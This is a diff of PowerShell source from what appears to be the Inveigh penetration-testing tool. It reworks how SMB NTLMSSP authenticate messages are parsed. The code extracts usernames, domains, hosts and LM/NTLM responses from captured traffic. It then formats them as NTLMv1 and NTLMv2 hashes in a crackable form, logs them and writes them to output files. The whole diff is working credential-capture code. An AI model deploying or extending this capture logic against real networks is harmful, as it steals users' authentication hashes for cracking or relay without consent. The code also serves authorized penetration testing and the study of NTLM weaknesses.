@@ -829,19 +829,27 @@ $shared_basic_functions_scriptblock =
 	   return [System.BitConverter]::ToUInt32($field,0)
     }
 
-    function DataLength
+    function DataLength2
     {
         param ([Int]$length_start,[Byte[]]$string_extract_data)
 
-        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start + 1)],0)
+        $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
+        return $string_length
+    }
+
+    function DataLength4
+    {
+        param ([Int]$length_start,[Byte[]]$string_extract_data)
+
+        $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)
         return $string_length
     }
 
     function DataToString
     {
-        param ([Int]$string_length,[Int]$string2_length,[Int]$string3_length,[Int]$string_start,[Byte[]]$string_extract_data)
+        param ([Int]$string_start,[Int]$string_length,[Byte[]]$string_extract_data)
 
-        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length - 1)])
+        $string_data = [System.BitConverter]::ToString($string_extract_data[$string_start..($string_start + $string_length - 1)])
         $string_data = $string_data -replace "-00",""
         $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
@@ -875,102 +883,98 @@ $SMB_NTLM_functions_scriptblock =
 
         $payload = [System.BitConverter]::ToString($payload_bytes)
         $payload = $payload -replace "-",""
-        $NTLM_index = $payload.IndexOf("4E544C4D53535000")
-        $NTLM_bytes_index = $NTLM_index / 2
+        $NTLMSSP_hex_offset = $payload.IndexOf("4E544C4D53535000")
 
-        if($payload.SubString(($NTLM_index + 16),8) -eq "03000000")
+        if($payload.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
         {
-            $LM_length = DataLength ($NTLM_bytes_index + 12) $payload_bytes
-            $LM_offset = $payload_bytes[($NTLM_bytes_index + 16)]
+            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2
 
-            if($LM_length -ge 24)
+            $LM_length = DataLength2 ($NTLMSSP_offset + 12) $payload_bytes
+            $LM_offset = DataLength4 ($NTLMSSP_offset + 16) $payload_bytes
+            $LM_response = [System.BitConverter]::ToString($payload_bytes[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace "-",""
+
+            $NTLM_length = DataLength2 ($NTLMSSP_offset + 20) $payload_bytes
+            $NTLM_offset = DataLength4 ($NTLMSSP_offset + 24) $payload_bytes
+            $NTLM_response = [System.BitConverter]::ToString($payload_bytes[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
+
+            $domain_length = DataLength2 ($NTLMSSP_offset + 28) $payload_bytes
+            $domain_offset = DataLength4 ($NTLMSSP_offset + 32) $payload_bytes
+            $NTLM_domain_string = DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $payload_bytes
+
+            $user_length = DataLength2 ($NTLMSSP_offset + 36) $payload_bytes
+            $user_offset = DataLength4 ($NTLMSSP_offset + 40) $payload_bytes
+            $NTLM_user_string = DataToString ($NTLMSSP_offset + $user_offset) $user_length $payload_bytes
+
+            $host_length = DataLength2 ($NTLMSSP_offset + 44) $payload_bytes
+            $host_offset = DataLength4 ($NTLMSSP_offset + 48) $payload_bytes
+            $NTLM_host_string = DataToString ($NTLMSSP_offset + $host_offset) $host_length $payload_bytes
+
+            if ($NTLM_length -gt 24)
             {
-                $NTLM_length = DataLength ($NTLM_bytes_index + 20) $payload_bytes
-                $NTLM_offset = $payload_bytes[($NTLM_bytes_index + 24)]
-                $NTLM_domain_length = DataLength ($NTLM_bytes_index + 28) $payload_bytes
-                $NTLM_domain_offset = DataLength ($NTLM_bytes_index + 32) $payload_bytes
-                $NTLM_domain_string = DataToString $NTLM_domain_length 0 0 ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes
-                $NTLM_user_length = DataLength ($NTLM_bytes_index + 36) $payload_bytes
-                $NTLM_user_string = DataToString $NTLM_user_length $NTLM_domain_length 0 ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes
-                $NTLM_host_length = DataLength ($NTLM_bytes_index + 44) $payload_bytes
-                $NTLM_host_string = DataToString $NTLM_host_length $NTLM_user_length $NTLM_domain_length ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes
+                $NTLMv2_response = $NTLM_response.Insert(32,':')
+                $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
 
-                if(([System.BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $LM_offset)..($NTLM_bytes_index + $LM_offset + $LM_length - 1)]) -replace "-","") -eq ("00" * $LM_length))
+                if($source_IP -ne $IP -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
                 {
-                    $NTLMv2_response = [System.BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $NTLM_offset)..($NTLM_bytes_index + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
-                    $NTLMv2_response = $NTLMv2_response.Insert(32,':')
-                    $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response       
+                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])
+                    $inveigh.NTLMv2_list.Add($NTLMv2_hash)
 
-                    if($source_IP -ne $IP -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
-                    {      
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])   
-                        $inveigh.NTLMv2_list.Add($NTLMv2_hash)
-
-                        if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
-                        {
-                            $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash")
-                        }
-                        else
-                        {
-                            $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string) for $NTLM_domain_string\$NTLM_user_string - not unique")
-                        }
-
-                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
-                        {
-                            $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash)
-                            $inveigh.console_queue.Add("SMB NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
-                        }
-
-                        if($inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
-                        {
-                            $inveigh.NTLMv2_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
-                        }
-
+                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
+                    {
+                        $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash")
+                    }
+                    else
+                    {
+                        $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string) for $NTLM_domain_string\$NTLM_user_string - not unique")
                     }
 
-                }
-                else
-                {
-                    $NTLMv1_response = [System.BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $LM_offset)..($NTLM_bytes_index + $LM_offset + $NTLM_length + $LM_length - 1)]) -replace "-",""
-                    $NTLMv1_response = $NTLMv1_response.Insert(48,':')
-                    $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLMv1_response + ":" + $NTLM_challenge
-
-                    if($source_IP -ne $IP -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
-                    {    
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])
-                        $inveigh.NTLMv1_list.Add($NTLMv1_hash)
-
-                        if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
-                        {
-                            $inveigh.console_queue.Add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash")
-                        }
-                        else
-                        {
-                            $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string) for $NTLM_domain_string\$NTLM_user_string - not unique")
-                        }
-
-                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
-                        {
-                            $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash)
-                            $inveigh.console_queue.Add("SMB NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
-                        }
-
-                        if($inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
-                        {
-                            $inveigh.NTLMv1_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
-                        }
-                    
+                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
+                    {
+                        $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash)
+                        $inveigh.console_queue.Add("SMB NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                     }
 
+                    if($inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
+                    {
+                        $inveigh.NTLMv2_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
+                    }
                 }
+            }
+            else
+            {
+                $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge
 
-                if ($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
+                if($source_IP -ne $IP -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
                 {
-                    $inveigh.IP_capture_list.Add($source_IP.IPAddressToString)
-                }
+                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])
+                    $inveigh.NTLMv1_list.Add($NTLMv1_hash)
 
+                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
+                    {
+                        $inveigh.console_queue.Add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash")
+                    }
+                    else
+                    {
+                        $inveigh.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string) for $NTLM_domain_string\$NTLM_user_string - not unique")
+                    }
+
+                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
+                    {
+                        $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash)
+                        $inveigh.console_queue.Add("SMB NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
+                    }
+
+                    if($inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
+                    {
+                        $inveigh.NTLMv1_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
+                    }
+                }
             }
 
+            if ($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
+            {
+                $inveigh.IP_capture_list.Add($source_IP.IPAddressToString)
+            }
         }
 
     }
